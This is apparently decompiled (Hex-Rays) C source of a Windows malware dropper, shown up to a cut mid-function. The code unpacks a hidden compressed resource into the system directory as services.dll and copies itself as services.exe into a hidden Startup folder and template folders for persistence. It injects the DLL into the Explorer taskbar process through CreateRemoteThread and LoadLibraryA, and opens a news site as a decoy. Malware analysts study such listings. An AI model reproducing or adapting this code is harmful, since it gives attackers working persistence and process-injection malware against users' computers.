/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(LPCVOID lpBuffer, LPCSTR lpFileName, DWORD nNumberOfBytesToWrite); // idb
int __cdecl sub_401048(LPCSTR lpFileName); // idb
BOOL __cdecl sub_4010C3(HWND hWnd, LPCVOID lpBuffer);
BOOL sub_401172();
CHAR *__cdecl sub_401197(int csidl);
CHAR *__cdecl sub_4012A2(int csidl);
int sub_4012ED();
int sub_4013A6();
int sub_401444();
int __stdcall sub_40148D(int a1, int a2, int a3, int a4);
HINSTANCE sub_4014A6();
int __cdecl sub_4014BE(int, int, SIZE_T dwBytes); // idb
BOOL __cdecl sub_401536(LPVOID lpMem);
LPVOID __cdecl sub_401549(LPVOID lpMem, SIZE_T dwBytes);
LPVOID __cdecl sub_401560(SIZE_T dwBytes);
int __cdecl sub_401573(_BYTE *a1, int a2);
void __noreturn start(); // weak
void __cdecl __noreturn sub_401690(UINT uExitCode); // idb
int __cdecl sub_4016C5(int (**a1)(void), unsigned int a2, int a3);
int sub_4016EC();
unsigned int __cdecl sub_401710(int a1, _DWORD *a2, _BYTE *a3, int a4);
// int __usercall sub_401850@<eax>(int a1@<eax>, int a2@<esi>);
// unsigned int __usercall sub_401930@<eax>(_DWORD *a1@<edx>, int a2@<edi>, unsigned int a3);
// int __usercall sub_4019D0@<eax>(int *a1@<edx>, int a2@<ecx>, int a3);
// int __usercall sub_401A50@<eax>(int *a1@<edx>, unsigned __int16 *a2);
unsigned int __cdecl sub_401AB0(int *a1, _DWORD *a2, _DWORD *a3);
// int __usercall sub_401C90@<eax>(int a1@<eax>, unsigned __int16 *a2@<ebx>, unsigned __int16 *a3);
// int __usercall sub_401D60@<eax>(int *a1@<eax>);
int sub_401DD0();
int __cdecl sub_401E90(int a1, _DWORD *a2, unsigned __int8 *a3);
int __cdecl sub_401F90(int a1, unsigned int a2);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// LPVOID __stdcall LockResource(HGLOBAL hResData);
// HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC hResInfo);
// HRSRC __stdcall FindResourceA(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// HANDLE __stdcall CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// LPVOID __stdcall VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// LPSTR __stdcall GetCommandLineA();
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall SHGetPathFromIDListA(LPCITEMIDLIST pidl, LPSTR pszPath);
// HINSTANCE __stdcall ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// HRESULT __stdcall SHGetSpecialFolderLocation(HWND hwnd, int csidl, LPITEMIDLIST *ppidl);
// DWORD __stdcall GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
// HWND __stdcall GetForegroundWindow();
// BOOL __stdcall IsWindow(HWND hWnd);
// HWND __stdcall FindWindowA(LPCSTR lpClassName, LPCSTR lpWindowName);
// void __stdcall CoTaskMemFree(LPVOID pv);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_402114; // weak
char byte_402118[24] =
{
  '\x10',
  '\x11',
  '\x12',
  '\0',
  '\b',
  '\a',
  '\t',
  '\x06',
  '\n',
  '\x05',
  '\v',
  '\x04',
  '\f',
  '\x03',
  '\r',
  '\x02',
  '\x0E',
  '\x01',
  '\x0F',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_402130[16] =
{
  0,
  498536548,
  997073096,
  651767980,
  1994146192,
  1802195444,
  1303535960,
  1342533948,
  -306674912,
  -267414716,
  -690576408,
  -882789492,
  -1687895376,
  -2032938284,
  -1609899400,
  -1111625188
}; // idb
int (*dword_403000)(void) = NULL; // idb
_UNKNOWN unk_403004; // weak
int (*off_403008[2])(void) = { NULL, &loc_40167B }; // idb
_UNKNOWN unk_403010; // weak
int (*dword_403014)(void) = NULL; // idb
_UNKNOWN unk_403018; // weak
int (*dword_40301C)(void) = NULL; // idb
_UNKNOWN unk_403020; // weak
int dword_403040 = 0; // weak
int dword_403060[32] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
HANDLE hHeap = NULL; // idb
int (*dword_4030E4)(void) = NULL; // weak
__int16 word_403100 = 0; // weak
char byte_403102[] = { '\0' }; // weak
int dword_403120 = 0; // weak
char byte_403124[24] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
char byte_40313C = '\0'; // weak
unsigned __int16 word_403140[79] =
{
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u
}; // idb
__int16 word_4031DE[225] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  }; // idb
__int16 word_4033A0[32]; // idb
__int16 word_4033E0[28]; // idb
__int16 word_403418; // weak
unsigned __int16 word_403420[1520]; // idb


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(LPCVOID lpBuffer, LPCSTR lpFileName, DWORD nNumberOfBytesToWrite)
{
  HANDLE v3; // esi
  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-4h] BYREF

  v3 = CreateFileA(lpFileName, 0xC0000000, 0, 0, 2u, 0x80u, 0);
  if ( !v3 )
    return 1;
  WriteFile(v3, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
  CloseHandle(v3);
  return 0;
}

//----- (00401048) --------------------------------------------------------
int __cdecl sub_401048(LPCSTR lpFileName)
{
  HMODULE v1; // esi
  HRSRC v2; // edi
  HGLOBAL v3; // eax
  LPVOID v4; // ebx
  int v6; // eax
  void *v7; // eax
  void *v8; // esi
  DWORD nNumberOfBytesToWrite; // [esp+Ch] [ebp-4h] BYREF

  v1 = GetModuleHandleA(0);
  v2 = FindResourceA(v1, (LPCSTR)1, (LPCSTR)0xA);
  v3 = LoadResource(v1, v2);
  v4 = LockResource(v3);
  if ( !v4 )
    return 1;
  v6 = SizeofResource(v1, v2);
  if ( !v6 )
    return 2;
  v7 = (void *)sub_4014BE((int)v4, v6, (SIZE_T)&nNumberOfBytesToWrite);
  v8 = v7;
  if ( !v7 )
    return 3;
  sub_401000(v7, lpFileName, nNumberOfBytesToWrite);
  sub_401536(v8);
  return 0;
}

//----- (004010C3) --------------------------------------------------------
BOOL __cdecl sub_4010C3(HWND hWnd, LPCVOID lpBuffer)
{
  SIZE_T v2; // esi
  HANDLE v3; // edi
  HMODULE v4; // eax
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // eax
  BOOL v7; // [esp+Ch] [ebp-10h]
  void *lpParameter; // [esp+10h] [ebp-Ch]
  SIZE_T NumberOfBytesWritten; // [esp+14h] [ebp-8h] BYREF
  DWORD dwProcessId; // [esp+18h] [ebp-4h] BYREF

  v2 = strlen((const char *)lpBuffer);
  NumberOfBytesWritten = 0;
  if ( IsWindow(hWnd) )
    GetWindowThreadProcessId(hWnd, &dwProcessId);
  v3 = OpenProcess(0x1F0FFFu, 0, dwProcessId);
  lpParameter = VirtualAllocEx(v3, 0, v2, 0x3000u, 4u);
  v7 = WriteProcessMemory(v3, lpParameter, lpBuffer, v2, &NumberOfBytesWritten);
  if ( v7 )
  {
    v4 = GetModuleHandleA("KERNEL32.DLL");
    if ( !v4 )
      v4 = GetModuleHandleA("kernel32.dll");
    LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(v4, "LoadLibraryA");
    CreateRemoteThread(v3, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpParameter, 0, 0);
  }
  return v7;
}

//----- (00401172) --------------------------------------------------------
BOOL sub_401172()
{
  HWND v0; // eax

  v0 = FindWindowA("Shell_TrayWnd", 0);
  if ( !v0 )
    v0 = GetForegroundWindow();
  return sub_4010C3(v0, "services.dll");
}

//----- (00401197) --------------------------------------------------------
CHAR *__cdecl sub_401197(int csidl)
{
  CHAR *result; // eax
  CHAR *v2; // ebx
  char *v3; // eax
  char *v4; // ebx
  char *lpMem; // [esp+4h] [ebp-8h]
  LPITEMIDLIST ppidl; // [esp+8h] [ebp-4h] BYREF

  result = (CHAR *)sub_401560(0x105u);
  v2 = result;
  if ( result )
  {
    if ( SHGetSpecialFolderLocation(0, csidl, &ppidl) || !SHGetPathFromIDListA(ppidl, v2) )
      goto LABEL_6;
    CoTaskMemFree(ppidl);
    strcat(v2, "\\");
    v2 = (CHAR *)sub_401549(v2, strlen(v2) + 1);
    if ( !v2 )
      goto LABEL_8;
    v3 = (char *)sub_401560(0xDu);
    lpMem = v3;
    if ( !v3 )
    {
LABEL_6:
      sub_401536(v2);
      return 0;
    }
    strcpy(v3, "services.exe");
    v4 = (char *)sub_401549(v2, strlen(v3) + strlen(v2) + 1);
    if ( v4 )
    {
      strcat(v4, lpMem);
      sub_401536(lpMem);
      result = v4;
    }
    else
    {
LABEL_8:
      result = 0;
    }
  }
  return result;
}

//----- (004012A2) --------------------------------------------------------
CHAR *__cdecl sub_4012A2(int csidl)
{
  CHAR *result; // eax
  CHAR *v2; // esi
  CHAR Filename[264]; // [esp+4h] [ebp-108h] BYREF

  result = sub_401197(csidl);
  v2 = result;
  if ( result )
  {
    if ( GetModuleFileNameA(0, Filename, 0x104u) )
      CopyFileA(Filename, v2, 0);
    result = (CHAR *)sub_401536(v2);
  }
  return result;
}

//----- (004012ED) --------------------------------------------------------
int sub_4012ED()
{
  char *v1; // edi
  char *v3; // edi
  CHAR Filename[263]; // [esp+0h] [ebp-210h] BYREF
  char v7; // [esp+107h] [ebp-109h] BYREF
  CHAR pszPath[260]; // [esp+108h] [ebp-108h] BYREF
  LPITEMIDLIST ppidl; // [esp+20Ch] [ebp-4h] BYREF

  if ( SHGetSpecialFolderLocation(0, 7, &ppidl) )
    return 1;
  if ( !SHGetPathFromIDListA(ppidl, pszPath) )
    return 2;
  CoTaskMemFree(ppidl);
  SetFileAttributesA(pszPath, 2u);
  v1 = &v7;
  while ( *++v1 )
    ;
  strcpy(v1, "\\");
  v3 = &v7;
  while ( *++v3 )
    ;
  strcpy(v3, "services.exe");
  if ( !GetModuleFileNameA(0, Filename, 0x104u) )
    return 3;
  CopyFileA(Filename, pszPath, 0);
  return 0;
}

//----- (004013A6) --------------------------------------------------------
int sub_4013A6()
{
  char *v1; // edi
  char *v3; // edi
  char v5; // [esp+3h] [ebp-109h] BYREF
  CHAR Buffer[264]; // [esp+4h] [ebp-108h] BYREF

  sub_4012A2(21);
  sub_4012A2(43);
  sub_4012ED();
  if ( !GetSystemDirectoryA(Buffer, 0x104u) )
    return 1;
  if ( strlen(Buffer) + 13 > 0x104 )
    return 2;
  v1 = &v5;
  while ( *++v1 )
    ;
  strcpy(v1, "\\");
  v3 = &v5;
  while ( *++v3 )
    ;
  strcpy(v3, "services.dll");
  sub_401048(Buffer);
  sub_401172();
  return 0;
}

//----- (00401444) --------------------------------------------------------
int sub_401444()
{
  CHAR Filename[264]; // [esp+8h] [ebp-108h] BYREF

  GetModuleFileNameA(0, Filename, 0x104u);
  return strcmp((const char *)(sub_401573(Filename, 92) + 1), "services.exe");
}

//----- (0040148D) --------------------------------------------------------
int __stdcall sub_40148D(int a1, int a2, int a3, int a4)
{
  sub_4013A6();
  if ( sub_401444() )
    sub_4014A6();
  return 1;
}

//----- (004014A6) --------------------------------------------------------
HINSTANCE sub_4014A6()
{
  return ShellExecuteA(0, "open", "http://news.google.com/", 0, 0, 3);
}

//----- (004014BE) --------------------------------------------------------
int __cdecl sub_4014BE(int a1, int a2, SIZE_T dwBytes)
{
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  LPVOID v7; // eax
  int result; // eax
  int v9; // [esp+Ch] [ebp-4h] BYREF
  int v10; // [esp+18h] [ebp+8h]

  sub_401DD0();
  v4 = *(unsigned __int8 *)(a1 + a2 - 1);
  *(_DWORD *)dwBytes = v4;
  v5 = *(unsigned __int8 *)(a1 + a2 - 2) + (v4 << 8);
  *(_DWORD *)dwBytes = v5;
  v6 = *(unsigned __int8 *)(a1 + a2 - 3) + (v5 << 8);
  *(_DWORD *)dwBytes = v6;
  *(_DWORD *)dwBytes = (v6 << 8) + *(unsigned __int8 *)(a1 + a2 - 4);
  v7 = sub_401560(dwBytes);
  v10 = (int)v7;
  if ( v7 && (v9 = *(_DWORD *)dwBytes, !sub_401710((int)v7, &v9, (_BYTE *)a1, a2)) && v9 == *(_DWORD *)dwBytes )
    result = v10;
  else
    result = 0;
  return result;
}

//----- (00401536) --------------------------------------------------------
BOOL __cdecl sub_401536(LPVOID lpMem)
{
  return HeapFree(hHeap, 0, lpMem);
}

//----- (00401549) --------------------------------------------------------
LPVOID __cdecl sub_401549(LPVOID lpMem, SIZE_T dwBytes)
{
  return HeapReAlloc(hHeap, 0, lpMem, dwBytes);
}

//----- (00401560) --------------------------------------------------------
LPVOID __cdecl sub_401560(SIZE_T dwBytes)
{
  return HeapAlloc(hHeap, 0, dwBytes);
}

//----- (00401573) --------------------------------------------------------
int __cdecl sub_401573(_BYTE *a1, int a2)
{
  _BYTE *v2; // ecx

  v2 = a1;
  if ( *a1 )
  {
    do
      ++v2;
    while ( *v2 );
    while ( v2 != a1 && (char)*v2 != a2 )
      --v2;
  }
  return a2 == (char)*v2 ? (unsigned int)v2 : 0;
}

//----- (004015A4) --------------------------------------------------------
void __noreturn start()
{
  LPSTR v0; // esi
  unsigned __int8 v1; // cl
  CHAR v2; // al
  int v3; // eax
  HMODULE v4; // eax
  int v5; // eax
  int v6; // [esp-8h] [ebp-4Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+0h] [ebp-44h] BYREF

  if ( dword_4030E4 && !dword_4030E4() )
    ExitProcess(0xFFFFFFFE);
  if ( sub_4016C5(off_403008, (unsigned int)&unk_403010, 1) )
    ExitProcess(0xFFFFFFFD);
  sub_4016C5(&dword_403000, (unsigned int)&unk_403004, 0);
  v0 = GetCommandLineA();
  if ( !v0 )
    v0 = (LPSTR)&unk_402114;
  v1 = 32;
  while ( 1 )
  {
    if ( !*v0 )
      goto LABEL_20;
    if ( (unsigned __int8)*v0 > 0x20u )
      break;
    ++v0;
  }
  v2 = *v0;
  do
  {
    if ( v2 == 34 )
      v1 ^= 0x20u;
    v2 = *++v0;
  }
  while ( (unsigned __int8)*v0 > v1 );
LABEL_20:
  while ( *v0 && (unsigned __int8)*v0 <= v1 )
    ++v0;
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  if ( (StartupInfo.dwFlags & 1) != 0 )
    v3 = StartupInfo.wShowWindow;
  else
    v3 = 10;
  v6 = v3;
  v4 = GetModuleHandleA(0);
  v5 = sub_40148D((int)v4, 0, (int)v0, v6);
  sub_401690(v5);
}
// 4015A4: using guessed type void __noreturn start();
// 4030E4: using guessed type int (*dword_4030E4)(void);

//----- (00401690) --------------------------------------------------------
void __cdecl __noreturn sub_401690(UINT uExitCode)
{
  sub_4016EC();
  sub_4016C5(&dword_403014, (unsigned int)&unk_403018, 0);
  sub_4016C5(&dword_40301C, (unsigned int)&unk_403020, 0);
  ExitProcess(uExitCode);
}

//----- (004016C5) --------------------------------------------------------
int __cdecl sub_4016C5(int (**a1)(void), unsigned int a2, int a3)
{
  int result; // eax

  while ( (unsigned int)a1 < a2 )
  {
    if ( *a1 )
    {
      result = (*a1)();
      if ( a3 )
      {
        if ( result )
          return result;
      }
    }
    ++a1;
  }
  return 0;
}

//----- (004016EC) --------------------------------------------------------
int sub_4016EC()
{
  int result; // eax

  while ( dword_403040 )
    result = ((int (*)(void))dword_403060[--dword_403040])();
  return result;
}
// 403040: using guessed type int dword_403040;

//----- (00401710) --------------------------------------------------------
unsigned int __cdecl sub_401710(int a1, _DWORD *a2, _BYTE *a3, int a4)
{
  char v4; // al
  unsigned __int8 *v5; // ebp
  int v8; // edi
  unsigned int result; // eax
  unsigned int v10; // edi
  int v11; // ebx

  if ( *a3 != 31 )
    return -3;
  if ( a3[1] != 0x8B )
    return -3;
  if ( a3[2] != 8 )
    return -3;
  v4 = a3[3];
  if ( (v4 & 0xE0) != 0 )
    return -3;
  v5 = a3 + 10;
  if ( (v4 & 4) != 0 )
    v5 += 256 * (unsigned __int8)a3[11] + *v5 + 2;
  if ( (v4 & 8) != 0 )
  {
    if ( *v5 )
    {
      while ( *++v5 )
        ;
    }
    ++v5;
  }
  if ( (v4 & 0x10) != 0 )
  {
    if ( *v5 )
    {
      while ( *++v5 )
        ;
    }
    ++v5;
  }
  if ( (v4 & 2) != 0 )
  {
    v8 = *v5 + (v5[1] << 8);
    if ( v8 != (unsigned __int16)sub_401F90((int)a3, v5 - a3) )
      return -3;
    v5 += 2;
  }
  v10 = (unsigned __int8)a3[a4 - 4]
      + (((unsigned __int8)a3[a4 - 3] + (((unsigned __int8)a3[a4 - 2] + ((unsigned __int8)a3[a4 - 1] << 8)) << 8)) << 8);
  v11 = (unsigned __int8)a3[a4 - 8]
      + (((unsigned __int8)a3[a4 - 7] + (((unsigned __int8)a3[a4 - 6] + ((unsigned __int8)a3[a4 - 5] << 8)) << 8)) << 8);
  if ( sub_401E90(a1, a2, v5) || *a2 != v10 )
    result = -3;
  else
    result = v11 == sub_401F90(a1, v10) ? 0 : 0xFFFFFFFD;
  return result;
}

//----- (00401850) --------------------------------------------------------
int __usercall sub_401850@<eax>(int a1@<eax>, int a2@<esi>)
{
  int v2; // ecx
  _WORD *v3; // edx
  int v4; // ecx
  _WORD *v5; // edx
  int v6; // ecx
  _WORD *v7; // eax
  int result; // eax
  _WORD *v9; // ecx

  v2 = 0;
  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  *(_WORD *)(a1 + 12) = 0;
  *(_WORD *)(a1 + 14) = 24;
  *(_WORD *)(a1 + 16) = 152;
  *(_WORD *)(a1 + 18) = 112;
  v3 = (_WORD *)(a1 + 32);
  do
    *v3++ = v2++ + 256;
  while ( v2 < 24 );
  v4 = 0;
  v5 = (_WORD *)(a1 + 80);
  do
    *v5++ = v4++;
  while ( v4 < 144 );
  *(_WORD *)(a1 + 368) = 280;
  *(_WORD *)(a1 + 370) = 281;
  *(_WORD *)(a1 + 372) = 282;
  *(_WORD *)(a1 + 374) = 283;
  *(_WORD *)(a1 + 376) = 284;
  *(_WORD *)(a1 + 378) = 285;
  *(_WORD *)(a1 + 380) = 286;
  *(_WORD *)(a1 + 382) = 287;
  v6 = 0;
  v7 = (_WORD *)(a1 + 384);
  do
    *v7++ = v6++ + 144;
  while ( v6 < 112 );
  result = 0;
  *(_DWORD *)a2 = 0;
  *(_DWORD *)(a2 + 4) = 0;
  *(_WORD *)(a2 + 8) = 0;
  *(_WORD *)(a2 + 10) = 32;
  v9 = (_WORD *)(a2 + 32);
  do
    *v9++ = result++;
  while ( result < 32 );
  return result;
}

//----- (00401930) --------------------------------------------------------
unsigned int __usercall sub_401930@<eax>(_DWORD *a1@<edx>, int a2@<edi>, unsigned int a3)
{
  unsigned int v3; // eax
  int v4; // ecx
  unsigned __int16 *v5; // eax
  int v6; // ebx
  int v7; // ebp
  unsigned int result; // eax
  unsigned __int8 v9; // cl
  __int16 v10[16]; // [esp+4h] [ebp-20h] BYREF

  v3 = 0;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  for ( a1[7] = 0; v3 < a3; ++v3 )
    ++*((_WORD *)a1 + *(unsigned __int8 *)(v3 + a2));
  v4 = 0;
  *(_WORD *)a1 = 0;
  v5 = (unsigned __int16 *)a1;
  v6 = 16;
  do
  {
    v7 = *v5;
    *(unsigned __int16 *)((char *)v5 + (char *)v10 - (char *)a1) = v4;
    v4 += v7;
    ++v5;
    --v6;
  }
  while ( v6 );
  for ( result = 0; result < a3; ++result )
  {
    v9 = *(_BYTE *)(result + a2);
    if ( v9 )
    {
      *((_WORD *)a1 + (unsigned __int16)v10[v9] + 16) = result;
      ++v10[*(unsigned __int8 *)(result + a2)];
    }
  }
  return result;
}

//----- (004019D0) --------------------------------------------------------
int __usercall sub_4019D0@<eax>(int *a1@<edx>, int a2@<ecx>, int a3)
{
  int v3; // ebx
  unsigned int v4; // edi
  unsigned int v5; // esi
  unsigned __int8 *v6; // eax
  int v7; // eax
  int v8; // ecx

  v3 = 0;
  if ( !a2 )
    return a3;
  v4 = 1 << a2;
  v5 = 1;
  if ( (unsigned int)(1 << a2) <= 1 )
    return a3;
  do
  {
    v6 = (unsigned __int8 *)a1[2];
    a1[2] = (int)(v6 - 1);
    if ( !v6 )
    {
      v7 = *a1 + 1;
      a1[1] = *(unsigned __int8 *)*a1;
      *a1 = v7;
      a1[2] = 7;
    }
    v8 = a1[1] & 1;
    a1[1] = (unsigned int)a1[1] >> 1;
    if ( v8 )
      v3 += v5;
    v5 *= 2;
  }
  while ( v5 < v4 );
  return v3 + a3;
}

//----- (00401A50) --------------------------------------------------------
int __usercall sub_401A50@<eax>(int *a1@<edx>, unsigned __int16 *a2)
{
  int v2; // ebx
  int v3; // esi
  unsigned __int16 *v4; // edi
  unsigned __int8 *v5; // eax
  int v6; // eax
  unsigned __int8 v7; // cl
  int v8; // eax

  v2 = 0;
  v3 = 0;
  v4 = a2;
  do
  {
    v5 = (unsigned __int8 *)a1[2];
    a1[2] = (int)(v5 - 1);
    if ( !v5 )
    {
      v6 = *a1 + 1;
      a1[1] = *(unsigned __int8 *)*a1;
      *a1 = v6;
      a1[2] = 7;
    }
    v7 = a1[1];
    ++v4;
    a1[1] = (unsigned int)a1[1] >> 1;
    v8 = *v4;
    v2 += v8;
    v3 = (v7 & 1) + 2 * v3 - v8;
  }
  while ( v3 >= 0 );
  return a2[v2 + 16 + v3];
}

//----- (00401AB0) --------------------------------------------------------
unsigned int __cdecl sub_401AB0(int *a1, _DWORD *a2, _DWORD *a3)
{
  int v3; // ebx
  unsigned int v4; // edi
  unsigned int v5; // esi
  char v6; // al
  int v7; // ecx
  unsigned int v8; // esi
  int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // edx
  unsigned int v12; // eax
  unsigned int v13; // edx
  unsigned int v14; // ecx
  int v15; // eax
  int v17; // [esp+10h] [ebp-3B0h]
  unsigned int v18; // [esp+14h] [ebp-3ACh]
  int v19; // [esp+18h] [ebp-3A8h]
  char v20; // [esp+1Fh] [ebp-3A1h]
  int v21[4]; // [esp+20h] [ebp-3A0h] BYREF
  __int16 v22; // [esp+30h] [ebp-390h]
  char i; // [esp+32h] [ebp-38Eh]
  unsigned __int16 v24[304]; // [esp+160h] [ebp-260h] BYREF

  v3 = sub_4019D0(a1, 5, 257);
  v19 = v3;
  v17 = sub_4019D0(a1, 5, 1);
  v4 = sub_4019D0(a1, 4, 4);
  v21[0] = 0;
  v21[1] = 0;
  v21[2] = 0;
  v21[3] = 0;
  v22 = 0;
  v5 = 0;
  for ( i = 0; v5 < v4; *((_BYTE *)v21 + v7) = v6 )
  {
    v6 = sub_4019D0(a1, 3, 0);
    v7 = (unsigned __int8)byte_402118[v5++];
  }
  sub_401930(v24, (int)v21, 0x13u);
  v8 = 0;
  v18 = v17 + v3;
  if ( v17 + v3 )
  {
    while ( 1 )
    {
      v9 = sub_401A50(a1, v24);
      if ( v9 == 16 )
      {
        LOBYTE(v3) = *(&v20 + v8);
        v12 = sub_4019D0(a1, 2, 3);
        v20 = HIBYTE(v12);
        if ( v12 )
        {
          BYTE1(v3) = v3;
          v13 = v12;
          v14 = v12 >> 2;
          v15 = v3 << 16;
          LOWORD(v15) = v3;
          memset32((char *)v21 + v8, v15, v14);
          memset((char *)&v21[v14] + v8, v3, v13 & 3);
          v8 += v13;
        }
        goto LABEL_14;
      }
      if ( v9 == 17 )
        break;
      if ( v9 == 18 )
      {
        v10 = sub_4019D0(a1, 7, 11);
        v11 = v10;
        if ( v10 )
          goto LABEL_9;
      }
      else
      {
        *((_BYTE *)v21 + v8++) = v9;
      }
LABEL_14:
      if ( v8 >= v18 )
      {
        v3 = v19;
        goto LABEL_16;
      }
    }
    v10 = sub_4019D0(a1, 3, 3);
    v11 = v10;
    if ( !v10 )
      goto LABEL_14;
LABEL_9:
    HIWORD(v3) = HIWORD(v10);
    memset((char *)v21 + v8, 0, 4 * (v10 >> 2) + (v11 & 3));
    v8 += v11;
    goto LABEL_14;
  }
LABEL_16:
  sub_401930(a2, (int)v21, v3);
  return sub_401930(a3, (int)v21 + v3, v17);
}

//----- (00401C90) --------------------------------------------------------
int __usercall sub_401C90@<eax>(int a1@<eax>, unsigned __int16 *a2@<ebx>, unsigned __int16 *a3)
{
  int v4; // eax
  bool i; // cc
  int v6; // eax
  int v7; // edi
  int v8; // eax
  int v9; // eax
  int j; // ecx

  v4 = sub_401A50((int *)a1, a3);
  for ( i = v4 < 256; v4 != 256; i = v4 < 256 )
  {
    if ( i )
    {
      **(_BYTE **)(a1 + 12) = v4;
      v6 = *(_DWORD *)(a1 + 12) + 1;
    }
    else
    {
      v7 = sub_4019D0((int *)a1, *((unsigned __int8 *)&dword_403120 + v4 - 257), (unsigned __int16)word_4031DE[v4]);
      v8 = sub_401A50((int *)a1, a2);
      v9 = sub_4019D0((int *)a1, *((unsigned __int8 *)&word_403100 + v8), (unsigned __int16)word_4033A0[v8]);
      for ( j = 0; j < v7; ++j )
        *(_BYTE *)(*(_DWORD *)(a1 + 12) + j) = *(_BYTE *)(*(_DWORD *)(a1 + 12) - v9 + j);
      v6 = v7 + *(_DWORD *)(a1 + 12);
    }
    *(_DWORD *)(a1 + 12) = v6;
    v4 = sub_401A50((int *)a1, a3);
  }
  **(_DWORD **)(a1 + 16) += *(_DWORD *)(a1 + 12) - a1;
  return 0;
}
// 403100: using guessed type __int16 word_403100;
// 403120: using guessed type int dword_403120;

//----- (00401D60) --------------------------------------------------------
int __usercall sub_401D60@<eax>(int *a1@<eax>)
{
  int v1; // ecx
  int v3; // esi
  int v4; // edi

  v1 = *(unsigned __int8 *)*a1 + (*(unsigned __int8 *)(*a1 + 1) << 8);
  if ( v1 != (unsigned __int16)~(*(unsigned __int8 *)(*a1 + 2) + (*(unsigned __int8 *)(*a1 + 3) << 8)) )
    return -3;
  *a1 += 4;
  if ( v1 )
  {
    v3 = v1;
    do
    {
      *(_BYTE *)a1[3] = *(_BYTE *)*a1;
      v4 = *a1 + 1;
      --v3;
      ++a1[3];
